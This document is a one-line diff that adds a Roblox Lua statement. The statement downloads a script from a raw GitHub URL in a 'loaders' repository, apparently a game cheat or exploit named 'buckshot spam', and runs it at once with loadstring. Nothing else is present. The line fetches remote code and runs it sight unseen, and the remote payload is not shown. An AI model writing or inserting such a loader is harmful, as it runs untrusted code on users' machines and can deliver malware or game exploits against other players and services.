@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/upd-buckshot-spam3-hxrs33v5oaaoyz.lua"))()
